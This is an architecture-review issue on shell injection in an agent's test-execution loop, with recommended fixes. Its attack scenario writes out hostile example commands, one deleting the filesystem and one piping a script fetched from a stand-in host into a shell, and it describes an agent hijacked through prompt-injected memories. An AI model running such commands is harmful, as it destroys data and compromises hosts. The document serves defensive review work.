---
labels: ["architecture-review", "adversarial"]
---

# Issue: Severe Shell Injection and Coupling in Arbor HTR

## Finding
The Arbor HTR (Hypothesis-Tree-Refinement) loop executes candidate test commands using raw POSIX shell invocation (`sh -c`) in git worktrees, as implemented in `mythrax-core/src/cognitive/arbor.rs`. Additionally, it tightly couples test execution logic with git operations, relying directly on the host machine's git binaries and shell environments.

## Current Assumption
The architecture assumes that the `test_command` string is trusted, well-formed, and completely free of shell control operators or adversarial inputs. It assumes that isolating git operations into separate temporary worktree directories is sufficient to prevent environment pollution or host compromise.

## Attack Scenario
An adversarial agent, or a hijacked agent processing prompt-injected memories (see Prompt Injection issue), synthesizes code or generates a `test_command` that contains shell operators (e.g., `cargo test; rm -rf /` or `cargo test & curl malicious.sh | sh`). When the Arbor HTR loop passes this string to `Command::new("sh").arg("-c").arg(test_command)`, the adversarial command is executed directly on the host machine.

## Blast Radius
**Full Host Compromise.** Shell injection allows the attacker to break out of the git worktree isolation entirely. The attacker can execute arbitrary commands with the privileges of the running daemon process, potentially exfiltrating sensitive data, corrupting the database, or installing persistent backdoors on the host machine. This also demonstrates extreme coupling, where the cognitive loop cannot be safely decoupled or deployed independently from the host's raw shell environment.

## Recommended Structural Change
1. **Remove Shell Invocation:** Replace `sh -c` with direct process execution (`Command::new("program").args(...)`) after properly tokenizing the command. Reject any `test_command` containing shell operators (`|`, `&`, `;`, etc.).
2. **Containerized Sandboxing:** Decouple the test execution environment from the host system entirely. Execute Arbor HTR evaluations inside isolated Docker containers or Firecracker microVMs where arbitrary command execution cannot harm the host or other agent sessions.

*Note: Do not close this issue without a documented Architectural Decision Record (ADR) response.*